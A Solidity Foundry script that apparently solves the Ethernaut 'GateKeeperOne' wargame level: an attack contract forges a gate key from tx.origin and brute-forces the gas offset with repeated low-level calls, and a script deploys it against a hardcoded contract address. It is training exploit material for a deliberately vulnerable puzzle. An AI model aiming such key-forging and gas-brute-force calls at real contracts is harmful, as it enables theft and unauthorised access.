// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IGateKeeperOne{
    function enter(bytes8 _gateKey) external returns (bool);   
}

contract GatekeeperOneAttack{

    IGateKeeperOne public target;
    constructor(address _target){
        target = IGateKeeperOne(_target);
    } 

    function attack() public {
        //construct keysatisfying three gate
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | (1 << 32));

        // bruteforce for gatetwo
        for(uint256 i=0;i<300;i++){
            (bool success, ) = address(target).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature(
                    "enter(bytes8)",key
                )
            );
            if (success){
                break;
            }
        }    
    } 
     
}

contract GateKeeperSolution is Script {

  
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        GatekeeperOneAttack attack = new GatekeeperOneAttack(0x04163d2F12d2F811906DD935625A3e9372e35AdC); 
        attack.attack();
        vm.stopBroadcast();
    }
}
